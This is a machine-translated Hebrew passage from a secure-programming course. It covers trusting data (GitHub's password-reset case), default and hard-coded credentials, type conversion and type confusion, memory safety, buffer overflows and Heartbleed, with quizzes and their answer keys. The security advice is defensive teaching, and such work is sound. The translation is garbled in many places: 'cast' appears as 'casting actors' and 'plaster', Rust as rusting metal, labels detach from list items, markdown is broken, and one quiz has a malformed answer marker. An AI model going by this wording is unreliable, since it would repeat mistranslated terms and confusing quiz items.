אם זה חשוב, הקפד לעבד את הנתונים שלך באמצעות סביבה שאתה יכול לסמוך עליה. בדיוק כמו אימות קלט, אם התשובה חשובה לך לאחר עיבוד הנתונים, עליך לעבד את הנתונים שלך במערכת שאתה יכול לסמוך עליה. אם אתה מעבד נתונים באמצעות קובץ Script בדפדפן אינטרנט או ביישום נייד, ודפדפן האינטרנט או היישום הנייד עשויים להיות נשלטים על-ידי תוקף, אינך יכול לסמוך על שום דבר שהוא עושה; כל הנתונים הללו יהיו גלויים לתוקף והתוקף עשוי לכפות תוצאות שונות. אם התוקפים יכולים לתקוף רק את עצמם, זו לא בעיה, אבל וודאו שהיא מוגבלת לכך. אם מערכת לא מהימנה מעבדת נתונים מסוימים ושולחת לך את התוצאה, עליך להתייחס אליה כאל נתונים לא מהימנים.

מה שמוביל אותנו לכלל אצבע שימושי: *בכל פעם שניתנת לנו בחירה, נסה להשתמש בנתונים המהימנים יותר.*

דוגמה עשויה לעזור. מערכות רבות, כאשר נשלחת בקשה לאיפוס סיסמה, שולחות דוא"ל כדי לאשר את איפוס הסיסמה. פעם GitHub היה מבקש ממשתמש לא מהימן את כתובת הדוא"ל שלו. אם זה תאם לכתובת דוא"ל במסד הנתונים שלהם, תוך התעלמות מהבחנות באותיות רישיות/קטנות תוך שימוש בכללי האנגלית, GitHub ישלח את איפוס הסיסמה לכתובת הדוא"ל *כפי שסופקה על-ידי התוקף*. זה היה רעיון נורא. תקני דואר אלקטרוני אינם מבטיחים שהחלק המקומי של כתובת הדואר האלקטרוני (החלק שלפני **** הסימן @) אינו רגיש לרישיות (ראה [IETF RFC 5321 סעיף 2.3.11](https://tools.ietf.org/html/rfc5321#section-2.3.11)). על ידי המרת כתובת הדוא"ל לאותיות קטנות, אין ערובה לכך שהאיפוס יישלח לכתובת הדוא"ל הנכונה. מערכות דואר אלקטרוני רבות מתעלמות מהבחנות באותיות רישיות/קטנות, אך ייתכן שהן לא ישתמשו באנגלית! במערכות דוא"ל טורקיות מסוימות, החלק המקומי של כתובת הדוא"ל היה מנרמל לחשבון דוא"ל ** שונה מאשר החשבון המקורי. לדוגמה, **MIKE@example.org** ינרמל ל-mı  ke@example.org (**באמצעות i ללא נקודה), שיהיה חשבון דואר אלקטרוני שונה מ-mike@example.org ( ** המשתמש **ב-i** מנוקד). זה הוביל לפגיעות הניתנת לניצול (GitHub Security, [*הודעות דוא"ל לאיפוס סיסמה שנמסרו לכתובת הלא נכונה*](https://bounty.github.com/researchers/jagracey.html), 2016).

התקפה זו נראית עדינה, אך זוהי הפרה ברורה של כלל האצבע הבסיסי שלנו: אם יש לך נתונים מהימנים יותר זמינים, נסה להשתמש בנתונים מהימנים יותר ** ! לדוגמה, אם יש לך בקשה לאיפוס סיסמה וברצונך לשלוח הודעת דואר אלקטרוני כדי לאשר שהמשתמש שאושר במקור אישר אותה, עליך לשלוח את הדואר האלקטרוני לאיפוס בדיוק לכתובת הדואר האלקטרוני *שכבר אושרה* במסד הנתונים שלך. כבר אישרת שזו כתובת הדוא"ל הנכונה, כך שתוכל לתת בה אמון רב יותר. כלל פשוט זה  - *נסו להשתמש בנתונים המהימנים יותר* - ימנע התקפות עדינות רבות מבלי שתבחינו בכך.

עם זאת, יישומים רבים צריכים לעבד נתונים לא מהימנים. במקרה כזה, כאשר אתה צריך לעבד נתונים לא מהימנים, להתייחס אליהם כאל **_רדיואקטיביים_** - כלומר, להיזהר כאשר אתה מעבד את זה בכל דרך שהיא, לזכור שזה יכול להיות מן התוקף. ישנן דרכים רבות שאתה צריך להיות זהיר, כפי שנדון.

#### חידון 2.1: העדיפו נתונים מהימנים. התייחס לנתונים לא מהימנים כמסוכנים

\>\>אם אנו מקבלים בקשה לאיפוס סיסמה עבור חשבון דוא"ל, ויש לו התאמה חסרת רגישות לרישיות לחשבון דוא"ל מאומת במסד הנתונים שלנו, עלינו לשלוח את האישור לחשבון הדוא"ל שהמשתמש שלח זה עתה. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

ממש לא. תוקף פוטנציאלי שלח כתובת דוא"ל, ולכן הדבר היחיד שאתה יכול להיות בטוח בו הוא שמישהו שלח את כתובת הדוא"ל הזו. אם האיפוס הוא עבור חשבון מסוים, יש להשתמש רק בדואר אלקטרוני לכתובת *שידוע* כי היא חלה על חשבון זה (ממסד הנתונים), מכיוון שבאופן כללי אנו מעדיפים להשתמש בנתונים מהימנים (יותר).

איפוס סיסמה באמצעות דוא"ל בלבד אינו מנגנון אימות חזק מלכתחילה. אבל זה נסיבות נפוצות מספיק, וזה שימושי כדוגמה פשוטה.

[הסבר]

### הימנע מאישורי ברירת מחדל ואישורים מקודדים באופן קשיח

תוכניות רבות צריכות להשתמש במידע סודי. סוג נפוץ במיוחד של סוד הוא *אישור* (למשל, סיסמה או מפתח סודי).  אופן ההגנה עליהם תלוי באופן השימוש בהם, וקיימים שני שימושים נפוצים עבור אישורים:

* **נכנס**<br>התוכנה מקבלת אישורים מסוימים כקלט ובודקת אם הם תואמים לאימות משהו אחר.

* **יוצא**<br>התוכנה שולחת את האישורים למשהו אחר כדי לאמת את עצמה למשהו אחר.

#### הימנע מאישורי ברירת מחדל

לעולם אין לספק תוכנה עם אישורי ברירת מחדל. ישנם דפי אינטרנט אינסופיים שעוקבים אחר אישורי ברירת מחדל כמו  admin**/admin**. ברגע שמישהו ימצא את האישורים, סביר להניח שהם יגיעו בסופו של דבר לרישומים אלה. פעולה זו תאפשר לתוקפים לפרוץ לתוכנה שלך (אם מדובר באישור נכנס) או לתוכנה של אחרים (אם מדובר באישור יוצא). אם התוכנה כוללת התקנות רבות, ייתכן שכולם פגיעים בו זמנית. **זכור:** משתמשים בדרך כלל מקבלים את ברירת המחדל, ואם ברירת המחדל אינה מאובטחת, התוכנה תהיה לא מאובטחת. ערפול הקוד אינו מספיק; תוקפים רבים מיומנים למדי בחילוץ וניתוח של קבצי הפעלה.

הפתרון הרגיל לכך הוא לקבל מצב "כניסה ראשונה" שמזהה שאין עדיין אישור (סיסמה או מפתח), ולאחר מכן מאפשר למשתמש ליצור אחד ייחודי. זאת בהנחה שיש לאחסן אותו בכלל; במקרים מסוימים, אתה יכול פשוט לבקש מהמשתמש לספק אותו בכל פעם.

#### הימנע מאישורים מקודדים באופן קשיח, אחסן אותם בבטחה במקום זאת

אישורים מקודדים באופן קשיח הם אישורים המאוחסנים בתוך קוד המקור, קוד שעבר הידור או כל מיקום אחר שמישהו המורשה לעשות זאת אינו יכול לשנות במהירות.

אישורים מקודדים באופן קשיח הם טעויות. יש לשנות את האישורים בכל פעם שהתוכנה מותקנת לראשונה לשימוש, ויש לשנותה בקלות ובמהירות. אחסון אישורים בקוד מקור הוא רעיון גרוע במיוחד. קוד המקור מנוהל בדרך כלל על ידי מערכות בקרת גרסאות, כך שכל האישורים בקוד יהיו זמינים לכל מי שיש לו גישה לקוד מקור זה ... וזה לעתים קרובות הרבה יותר אנשים ממה שצריך לדעת. קידוד מידע זה באופן שניתן לבטל (לדוגמה, באמצעות Base64 או ROT13) אינו עוזר.

לכן: אל תקודד אישורים (למשל, בתוך קוד מקור או קוד שעבר הידור). במקום זאת, אחסן אישורים בנפרד באופן שיקל על שינוים. אישורי מפתח ציבורי בדרך כלל אינם צריכים להישמר בסוד, אך ייתכן שיהיה צורך לעדכן אותם. אישורים אחרים צריכים לעתים קרובות להישמר בסוד, ויש להגן עליהם לפחות במידת הצורך. כפי שנדון בקצרה בהמשך, ישנם כלים שעשויים לעזור לך לזהות אישורים מקודדים באופן קשיח בקוד המקור.

עבור אימות נכנס באמצעות סיסמאות, אחסן אישורים בנפרד והשתמש באלגוריתם מאובטח שתוכנן במיוחד לקידודם. נדון בכך ביתר פירוט בהמשך הפרק על קריפטוגרפיה, אך לעת עתה, רק דעו שעליכם להשתמש באלגוריתם *גיבוב קריפטוגרפי מלוח לכל משתמש* כגון Argon2id.

עבור אימות יוצא, יש לאחסן אישורים מחוץ לקוד במערכת אחסון המוגנת מפני כל הזרים (כולל משתמשים מקומיים באותה מערכת/מארח ענן). באופן אידיאלי, כל האישורים יאוחסנו בקובץ או מסד נתונים מוצפן, אך בסביבות רבות, קשה לעשות זאת (היכן מאחסנים את המפתח כדי לגשת למפתח?). לכל הפחות, אחסן אישורים במשהו כמו טבלת קבצים או מסד נתונים עם הרשאות שהן מגבילות ככל שתוכל ליצור אותן באופן מעשי. משתני סביבה הם בדרך כלל דרך חלשה יותר לאחסן אישורים, מכיוון שהערכים שלהם זמינים לכל התהליך שטוען אותם, אך בנסיבות מסוימות זה מקובל... וזה בדרך כלל הרבה יותר טוב מאשר אישורי קידוד קשה.

 אישורים מקודדים באופן קשיח הם סיבה כה נפוצה לפגיעויות אבטחה שהם 2021 CWE Top 25 #16 ו- 2019 CWE Top 25 #19. חולשה זו היא [CWE-798](https://cwe.mitre.org/data/definitions/798.html), *שימוש באישורים מקודדים באופן קשיח*. האישורים הקשורים *שאינם מוגנים מספיק הם 2021 CWE Top 25 #*21 ו- 2019 CWE Top 25 #27 כ- CWE-522[](https://cwe.mitre.org/data/definitions/522.html).

#### חידון 2.2: הימנע מאישורי ברירת מחדל וקידוד קשיח

\>\>מפתחות סודיים צריכים להיות מאוחסנים בקוד מקור כך שלא ניתן יהיה לקרוא אותם בקלות, כפי שהם יכולים להיות אם הם מאוחסנים בקבצים נפרדים. אמת או שקר?<<

( ) נכון

(x) לא נכון

[הסבר]

לא, להפך. אל תאחסן מפתחות סודיים בקוד מקור! קוד המקור משותף לעתים קרובות עם רבים אחרים, ומאוחסן במערכות בקרת גרסאות (מה שהופך אותו לנגיש יותר לאחרים). סיבה נוספת לאחסן מפתחות סודיים בנפרד היא כדי שניתן יהיה לשנות אותם בקלות. אם תוקף קורא את המפתחות הסודיים, פשוט שנה את המפתחות.

[הסבר]

### הימנע מהמרה שגויה או הטלת שחקנים

כמעט כל שפות התיכנות תומכות בסוגי נתונים מרובים, כגון מספרים שלמים, נקודה צפה, תווים ומחרוזות. ברוב שפות התכנות יש לפחות בדיקת סוג כלשהי המובנית בהן; ניתן לבדוק סוגים באופן סטטי (לפני זמן ריצה) ו/או באופן דינמי (בזמן ריצה). בדיקות אלה יכולות לפעמים להזהיר, או להתמודד, עם בעיות חמורות.

לפעמים יש צורך להמיר או להטיל ערך נתונים מסוג אחד למשנהו. הפרטים תלויים בשפת התכנות, אך בעוד שזה הכרחי, המרות שגויות והטלות בסופו של דבר גורמות למספר לא פרופורציונלי של פגיעויות. ההמרה עלולה לאבד מידע, או להוביל לערך חדש שעשוי היה להיות בלתי צפוי לחלוטין. כל המרה או ליהוק, במיוחד כזה שעלול לאבד מידע, צריך להיבדק כדי לשקול אם יש סיכון לעשות את זה. לשפות מסוימות יש  מזהה const ** להכרזה על קבועים; זה מסוכן להשליך את מזהה **const**, כי זה מאפשר שינויים בערך בעוד חלקים אחרים של המערכת עשויים להיות תלויים בכך שהוא קבוע.**

מקרה מיוחד, אשר יכול לקרות בכמה שפות תכנות, נקרא "בלבול סוג". בלבול סוגים מתרחש כאשר הגישה למשאב מתרחשת באמצעות סוג שאינו תואם לסוג המקורי שלו. זה יכול להיחשב המרה שגויה שקטה. ניתן לעשות זאת בקלות בשפות כמו C ו- C++ באמצעות סוגי איחוד, שבהם ניתן להגדיר במפורש את אותו אזור זיכרון כמאפשר סוגים מרובים. בעת שימוש בסוגי איחוד, על היזם לוודא שרק הסוג הנכון משמש לגישה נתונה (קריאה או כתיבה).

עם זאת, בלבול הסוגים אינו מוגבל ל- C ול- C++ . בלבול הקלדה יכול להתרחש בכל שפה שבה ניתן לפרש את אותו משתנה או מיקום זיכרון ביותר מדרך אחת. כפי שצוין על ידי MITRE עבור [CWE-843](https://cwe.mitre.org/data/definitions/843.html), "שגיאות ביישומי PHP יכולות להיות מופעלות על ידי מתן פרמטרים של מערך כאשר סקלרים צפויים, או להיפך. שפות כמו Perl, שמבצעות המרה אוטומטית של משתנה מסוג אחד כאשר ניגשים אליו כאילו היה סוג אחר, יכולות להכיל גם הן את הבעיות הללו".

לענייננו, המרות אינן כוללות קביעה אם ערך הוא אמת. באופן כללי, לשפות תכנות יש מבנים מותנים (כגון **if** **ו-while**) שיפיקו תוצאות שונות בהתאם לשאלה אם הערך של תנאי הוא אמיתי או לא. מה שנכון הוא החלטה עיצובית מרכזית בעת יצירת שפת תכנות. לדוגמה, כל ערך ב- JavaScript נחשב לאמת למעט רשימה ספציפית של ערכים מזויפים (נכון לעכשיו**, 0, **-0**, **0n, **"",** **null** ** ** **, **לא מוגדר** ו**- NaN****). בשפות כאלה,  אם **p** ודומיו הם קיצור דרך לבדיקה אם ערך הוא אמת. פרשנות זו בתנאים עשויה להיחשב כהמרה מסוג אחר לסוג בוליאני, אך מבנים כאלה הם למעשה רק דרך מקוצרת לקבוע אם ערך הוא אמיתי, וזה לא מה שאנחנו עוסקים בו כאן.

 *המרת סוג שגויה או הטלת* [ (CWE-704) היא סיבה נפוצה כל כך לפגיעויות אבטחה שהיא 2019 CWE Top 25 #28. 2021 CWE Top 25 #36 מתייחס למקרה המיוחד שלו, ](https://cwe.mitre.org/data/definitions/704.html)גישה למשאב באמצעות סוג לא תואם ('בלבול סוג') (**CWE-843[).](https://cwe.mitre.org/data/definitions/843.html)


#### חידון 2.3: הימנע מהמרה או הטלת שחקנים שגויים

\>\>איזה מהדברים הבאים עשוי להיות מדאיג לגבי גבס? בחר את כל התשובות הרלוונטיות.<<

[!x] צוות השחקנים עלול לאבד מידע חשוב.

[x] צוות השחקנים עשוי לייצר ערך חדש שלא היה צפוי בהקשר הזה.

[x] הגבס עשוי להסיר אם הערך נחשב קבוע או לא, מה שגורם לבעיות פוטנציאליות עבור קוד אחר שעשוי להיות תלוי בכך שהוא קבוע.

[ ] הגבס עשוי לשנות את הסוג.

[הסבר]

קאסט משנה את סוג הערך (בשביל זה הוא *מיועד*), כך שכשלעצמו זה לא נוגע. מה שמדאיג הן ההשפעות הפוטנציאליות של שינויים כאלה בהקשר.

[הסבר]

## עיבוד נתונים בצורה מאובטחת: התנהגות לא מוגדרת / בטיחות זיכרון

### התמודדות עם קריאות וכתיבה מחוץ לתחום (גלישת מאגר)

[קוד לא בטוח לזיכרון]

#### בטיחות זיכרון

למרבה הצער, טיפול בנתונים לא מהימנים יכול להיות * קשה במיוחד* בשפות תכנות מסוימות או כאשר מצבי שפת תכנות מסוימים מופעלים. רוב שפות התיכנות מונעות באופן אוטומטי כל ניסיון לקרוא או לכתוב אזורי זיכרון שאינם מוקצים. שפות אלה נקראות שפות בטוחות *לזיכרון*. עם זאת, למנגנוני בטיחות הזיכרון יש בדרך כלל תקורת ביצועים.

כתוצאה מכך, שפות תכנות מסוימות המדגישות את הביצועים אינן בטוחות ** לזיכרון או שיש להן דרך להשבית את בטיחות הזיכרון. שפות התכנות הנפוצות C ו- C++ אינן בטוחות ** לזיכרון. ישנן גם שפות מסוימות המדגישות ביצועים שהם *בדרך כלל* בטוחים לזיכרון, אך יש להם דרך להשבית בדיקות בטיחות כדי לאפשר ביצועים נאותים; אלה כוללים חלודה (בעת שימוש בקוד לא בטוח), C# (בעת שימוש בקוד לא בטוח) ו- Ada (בעת שימוש בדיכוי פרגמה כדי לדכא בדיקות בטיחות זיכרון).

בעיות בטיחות זיכרון הן סיבה נפוצה לפגיעויות. המחקר של Catalin Cimpanu, [*Microsoft: 70 אחוז מכל באגי האבטחה הם בעיות בטוחות בזיכרון*](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/) (2019), מצא כי כ ~ 70% מכל הפגיעויות של מיקרוסופט בשנים 2006-2018 נבעו מבעיות בטיחות זיכרון. יתרה מכך, בעוד שיש תנודות שנתיות, זה היה יציב יחסית לאורך זמן:

![בטיחות הזיכרון הפכה באופן עקבי לפגיעות לאורך זמן](memory_safety_over_time.png)

**אחוז פגיעויות בטיחות הזיכרון ב- Microsoft** (מאת Catalin Cimpanu, 2019, אוחזר מ- [ZDNet](https://www.zdnet.com/article/microsoft-70-percent-of-all-security-bugs-are-memory-safety-issues/))

בטיחות זיכרון היא תת-קבוצה של קטגוריה גדולה יותר הנקראת *התנהגות* לא מוגדרת, שבה המערכת אינה מבטיחה דבר - והתנהגות לא מוגדרת מובילה לעתים קרובות לפגיעויות אבטחה. נדון בכך יותר מאוחר, אך נציין בקצרה כי ל- C ו- C++ יש מספר גדול להפליא של התנהגויות לא מוגדרות, מה שמקשה במיוחד על כתיבת תוכנה מאובטחת בשפות אלה.

אתה יכול להיתקל בבעיות אלה *גם אם* אתה כותב קוד בשפה שהיא בטוחה לזיכרון ואין לה התנהגויות לא מוגדרות. הקוד שלך עשוי להתקשר ** לקוד אחר עם התנהגות לא מוגדרת שמובילה לפגיעויות. מכיוון שכמעט כל תוכנית בסופו של דבר קוראת לפחות לקוד מסוים שנכתב עם C או C++ , משמעות הדבר היא שלפחות חלקים מסוימים של התוכנית שלך עשויים להיות פגיעים בעקיפין, גם אם התוכנית שלך אינה כתובה ב- C או ב- C++ .

אחד הטריקים התוקפים הידועים ביותר הוא קריאות וכתיבה מחוץ לתחום (כולל *הצפת מאגר*) - אז נדבר בקצרה על מה זה ואיך להתמודד עם זה. לאחר מכן נדון בסוג אחר של פגם שלעתים קרובות מוביל לפגיעויות אבטחה, ללא תשלום כפול. לבסוף, נדון בקטגוריה הגדולה יותר של התנהגויות לא מוגדרות.

#### קריאה/כתיבה מחוץ לתחום והצפת מאגר

אחד הסוגים הנפוצים ביותר של פגיעויות אבטחה הוא כאשר קריאה או כתיבה נמצאות  "*מחוץ לתחום"* בתוך קוד לא בטוח בזיכרון. פגיעויות כאלה הן נפוצות, והתוקפים מוצאים אותן קלות לניצול. בעיה זו ידועה כבר זמן רב; Aleph One (אליאס לוי) מתאר בפירוט [*ב-Smashing the Stack for Fun and Profit*](http://phrack.org/issues/49/14.html#article) (1996) כיצד לנצל נקודות תורפה כאלה.

קריאות  וכתיבה מחוץ לתחום הן כה נפוצות ומסוכנות, עד שברשימת 25 המובילים של CWE לשנת 2021, החולשה #1 כוללת כתיבה (CWE-787 מחוץ לתחום [כתיבה](https://cwe.mitre.org/data/definitions/787.html)), החולשה #3 כוללת קריאות* (CWE-125  *מחוץ לתחום קריאה[), והבעיה הכללית היא #17](https://cwe.mitre.org/data/definitions/125.html)  (*CWE-119* [הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון](https://cwe.mitre.org/data/definitions/119.html)**). ברשימת 25 המובילים של CWE לשנת 2019 הבעיה הכללית היא #1[ (CWE-119  ](https://cwe.mitre.org/data/definitions/119.html)הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון*), ומקרים ספציפיים שלה הם #5 (CWE-125 *  מחוץ [לתחום קרא](https://cwe.mitre.org/data/definitions/125.html)) ו #12 (*CWE-787* [ מחוץ לתחום לכתוב](https://cwe.mitre.org/data/definitions/787.html)).**

הנה היסודות. כמעט כל התוכניות צריכות לאחסן תוצאות ביניים, ואזורי אחסון כאלה נקראים לעתים קרובות *מאגרים*. קריאה וכתיבה בתוך המאגר הזה זה בסדר. אך מה קורה כאשר התוכנית שלך מנסה לקרוא מתוך מאגר זה או לכתוב אליו, אך היא מנסה לעשות זאת מחוץ לטווח של אזור אחסון זה? לדוגמה, הנה קטע טריוויאלי של תוכנית C המקצה  מערך **כלשהו x** בגודל 10 (ערכי אינדקס 0 עד 9), ולאחר מכן מאחסן את הערך  של **y** לערך האינדקס **i** של מערך זה:

~~~~C
    char x[10];
    ...
    x[i] = y;
~~~~

מה קורה אם הערך של **i** הוא מחוץ לתחום (כלומר, יש ערך אחר מאשר 0 עד 9)? ישנן שתי אפשרויות בטוחות ונפוצות המתרחשות בשפות תכנות שונות:

1. **שינוי**<br> גודל בשפות תיכנות רבות, ניסיון לכתוב (או לקרוא) מחוץ לתחום ישנה את גודל המערך כך שניתן יהיה לאחסן או לקרוא ממנו את הערך.

2. ****<br> שגיאה בשפות מסוימות, במיוחד אלה המתמקדות בביצועים מצוינים, תדווח שגיאה (בדרך כלל חריגה) אם האינדקס הוא מחוץ לתחום.

למרבה הצער, קיימת אפשרות שלישית: קריאה או כתיבה מחוץ לתחום יכולה להתקבל ולהפוך לפגיעות אבטחה פוטנציאלית. אם אתה משתמש בשפה לא בטוחה לזיכרון, כגון C, C++ או שפת הרכבה, כל קריאה או כתיבה שעלולה לצאת מחוץ לתחום היא פגיעות אבטחה שעלולה להיות מסוכנת. בעיה זו עלולה להתרחש גם אם השפה בדרך כלל בטוחה לזיכרון, אך אתה הופך את בדיקות בטיחות הזיכרון של השפה ללא זמינות (כגון Rust, C# ו- Ada).

ב- C, כל ניסיון לקרוא או לכתוב מחוץ לגבולות המאגר (באמצעות אינדקס מערך או מצביע) הוא דוגמה להתנהגות *לא מוגדרת*. אם תוכנית C תבצע בסופו של דבר הצהרה שתגרום להתנהגות לא מוגדרת, הקוד רשאי לעשות הכל בכל עת - עוד לפני אותה הצהרה שגרמה להתנהגות הלא מוגדרת! תוכל למצוא מידע נוסף בהפניות הבאות:

* [*עם התנהגות לא מוגדרת, הכל אפשרי*](https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html) (2018), מאת ראפ לוין

* [*התנהגות לא מוגדרת יכולה לגרום למסע בזמן (בין היתר, אבל מסע בזמן הוא הכי מצחיק) (*](https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633) 2014), מאת ריימונד צ'ן

* [*מדריך להתנהגות לא מוגדרת ב- C ו- C++ (חלקים 1-3) (*](http://blog.regehr.org/archives/213) 2010), מאת ג'ון רג'ר.

בפועל**, אם אין בטיחות זיכרון, כתיבה מחוץ למאגר ברוב יישומי שפת התכנות לעתים קרובות בסופו של דבר משחיתה מבני נתונים פנימיים שהתוכנית תלויה בהם. לדוגמה, הוא עשוי להחליף משתנים מקומיים ו/או לשנות את מה שיופעל לאחר החזרת פונקציה. באופן דומה, קריאה מחוץ למאגר חושפת לעתים קרובות מידע פנימי שאינו נחשף בדרך כלל, כולל סודות שאבטחה (כגון מפתחות או מערכות הקשחה) תלויה בהם. בנוסף, אם זה C או C++, מהדרים ישתמשו לעתים קרובות בהצהרות כאלה כמו רישיון כדי ליצור קוד מכונה מפתיע מאוד (כי מחברי מהדר מותר להניח כי דברים כאלה לא יקרו). תוקפים חידדו את מלאכתם במשך עשרות שנים כדי לנצל את נקודות התורפה הללו, מכיוון שהן נפוצות ולעתים קרובות הם יכולים להפוך במהירות גילוי של פגיעות מסוג זה למתקפה הרסנית.

ישנם שמות רבים להתקפות אלה, עם טרמינולוגיה ומשמעויות שונות. אחת הווריאציות הנפוצות ביותר של פגיעות זו היא כאשר התוקף יכול לכתוב מעבר לסוף מערך, ופגיעות זו נקראת לעתים פגיעות *קלאסית של גלישת מאגר*. התקפה המנצלת פגיעות זו על-ידי כתיבת נתונים מחוץ למאגר נקראת לעתים קרובות  התקפת ניפוץ מחסנית (אם *  המאגר נמצא במחסנית, כגון על-ידי היותו פרמטר מקומי) או *התקפת ניפוץ ערימה* (אם המאגר נמצא בערימה, כלומר, הוקצה בעבר על-ידי *חדש**** או **malloc** בהתאם לשפה). ל- CWE יש מזהים ושמות שונים, כולל  CWE-119 ([הגבלה לא נכונה של פעולות בגבולות מאגר זיכרון](https://cwe.mitre.org/data/definitions/119.html)), שהוא מקרה מיוחד של *CWE-118 (*גישה שגויה למשאב הניתן לאינדקס ('שגיאת טווח')[).](https://cwe.mitre.org/data/definitions/118.html)* * 

אם תוקף יכול לגרום לתוכנית שלך לכתוב מחוץ למאגר שלה, לעתים קרובות התוצאה היא פגיעות חמורה שבה התוקף יכול לגרום לתוכנית לעשות משהו בכלל.

כתיבה ללא גבולות אינה הבעיה היחידה. מבחינה היסטורית, אנשים שמודאגים מקריאות מחוץ לתחום כותבים יותר מאשר קוראים, אבל הפגיעות של Heartbleed ב-2014 הראתה שקריאות מחוץ לתחום יכולות להיות גם מסוכנות ביותר. קריאות מחוץ לתחום יכולות לחשוף מידע המאפשר לתוקפים לפרוץ לחלוטין למערכת. אפילו תוכניות המאפשרות רק בית אחד של קריאה או כתיבה מחוץ לתחום עלולות להיות פגיעות מסוכנת.

![טקסט חלופי של תמונה](heartbleed.png)

**דימום הלב הסביר**. אוחזר מ- [xkcd](https://xkcd.com/1354/), מורשה תחת [CC-BY-NC-2.5](https://creativecommons.org/licenses/by-nc/2.5/)

>  שעת סיפור: דימום לב

> בשנת 2014 נמצאה פרצה בשם Heartbleed (CVE-2014-0160[](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0160)) בספריית ההצפנה OpenSSL הנמצאת בשימוש נרחב.  חולשת המפתח הייתה קריאת יתר של חיץ (מעבר לסוף המאגר) הותרה בערימה עקב אימות קלט לא תקין. פגיעות זו אפשרה לתוקפים להשיג נתונים רגישים, ו-OpenSSL ניהלה כמה נתונים רגישים במיוחד כגון מפתחות פרטיים של שרתים. פגיעות זו השפיעה על מספר עצום של אתרים פופולריים, והובילה לבעיות כגון חטיפת חשבונות משתמשים וסכנות מידע של מיליוני מטופלים. ([*כיצד למנוע את הדממת הבאה בלב, *](https://dwheeler.com/essays/heartbleed.html)2020, מאת דיוויד א. וילר)

#### פתרונות לקריאה וכתיבה מחוץ לטווח

אם אתה סקרן, ישנם מאמרים רבים וקורסים במכללה כי ללכת לעומק על בדיוק למה בעיה זו היא כל כך מסוכנת. אבל אם אתה רק מפתח תוכנה, הפרטים האלה לא חשובים - אתה פשוט צריך לוודא כי קורא וכותב הם תמיד בתוך הגבולות של מה שהם אמורים להתייחס. אז איך עושים את זה?

הפתרון הפשוט ביותר: **_תמיד, היכן שהדבר מעשי, השתמש בשפות בטוחות לזיכרון ושמור על בטיחות הזיכרון_**. כמעט כל שפות התכנות בטוחות לזיכרון, לפחות כברירת מחדל. אם תנסה לגשת למאגר מחוץ לגבולותיו בשפה בטוחה לזיכרון, הוא ישנה את גודל המאגר או ייתן לך שגיאה (בדרך כלל חריגה). בכל מקרה, המערכת לא רק מעבירה את השליטה לתוקף. פתרון זה קל יותר ליישום כאשר אתה כותב קוד מאפס, כמובן.

אבל לפעמים זה לא מעשי. משמעות הדבר היא שלעולם לא תוכל להשתמש בשפת C, C++ או שפת הרכבה. זה גם אומר שלעולם לא תוכל להשבית את בטיחות הזיכרון בשפות אחרות. יש הרבה תוכניות גדולות ב- C או C++ שיהיה קשה לשכתב, וכמובן, יש סיבות שאנשים בוחרים בשפות אלה. רוב ליבות מערכת ההפעלה נכתבות ב- C, מכיוון שהן קריטיות לביצועים ו- C תוכנן במיוחד עבור משימה זו. באופן דומה, בשפות המאפשרות לך להשבית את בטיחות הזיכרון, יש סיבות לקיומם של מנגנונים אלה.

אם דרוש לך ** קוד ללא בטיחות זיכרון, נסה להגביל את מה שאינו בטוח בזיכרון כאשר זה מעשי. לדוגמה, בשפות שהן בטוחות לזיכרון כברירת מחדל, אך כוללות מנגנונים להשבתתן, עליך למזער את כמות הקוד הפועלת ללא בטיחות זיכרון. ספרייה גדולה ב-Rust, C# או Ada אמורה להיות בטוחה כמעט לחלוטין, עם לכל היותר חלק קטן מאוד לא בטוח. אם יש לך קוד C או C++ קיים רב, שקול לשכתב חלק בשפה בטוחה לזיכרון. אם אתה משכתב חלק, אתה בדרך כלל צריך להתמקד  בחלק *המסוכן* ביותר  (כלומר, קוד כי הוא חשוף ביותר לתוקפים). לדוגמה, דפדפן הפיירפוקס של מוזילה נכתב בעיקר ב-C++ (וחלק מ-JavaScript), אך בשנת 2017 חלק מקוד C++ זה הוחלף על ידי יישומים ב-Rust, ויותר ויותר מפיירפוקס נכתב ב-Rust (Mozilla [*Oxidation*](https://wiki.mozilla.org/Oxidation) [*ו-Rust vs. C++ ב-macOS Firefox *](https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479)Nightly).

אם אתה צריך לתכנת ללא בדיקות בטיחות זיכרון, מכל סיבה שהיא, אז אתה צריך ליישם בזהירות את כל הבדיקות בקוד עצמו. למען האבטחה, עליך לוודא שלעולם לא תעשה טעות: עליך לוודא שכל הפניה נמצאת בגבולות, לא משנה מה התוקף עושה. כל בדיקה אינה קשה לביצוע; זה לא מדע טילים. הבעיה היא שאף פעם לא לעשות טעות קשה לעשות. אתה יכול להיות חכם מאוד ועדיין לעשות טעות. אם אתה כותב תוכנה ללא בדיקות בטיחות זיכרון, במידת האפשר, עליך להשתמש במנגנונים כמו כלים וביקורת עמיתים כדי להפחית את הסיכונים שמשהו יחליק למשתמשים. בהמשך נדון בחלק מהכלים העומדים לרשותנו כדי לעזור.

כמובן, רק לעשות בדיקה זה לא מספיק - מה עושים כאשר הבדיקה נכשלת? הדבר הבטוח ביותר לעשות הוא לדחות את הקלט ולא לבצע כל פעולה אם בדיקה נכשלת בדרך. עם זאת, לעתים קרובות קשה לעשות את הדחייה, ולכן מפתחים מתפתים פשוט לחתוך כל תוספת (או לכתוב קוד שעושה זאת בטעות). לפעמים זה בסדר, אבל לעתים קרובות זה אומר שתוקף יכול לשלוט במה שנשאר במאגר ובמה שלא. זה יכול לפעמים להוביל לפגיעויות, ולקבוע אם יש פגיעות יכול להיות קשה מאוד.

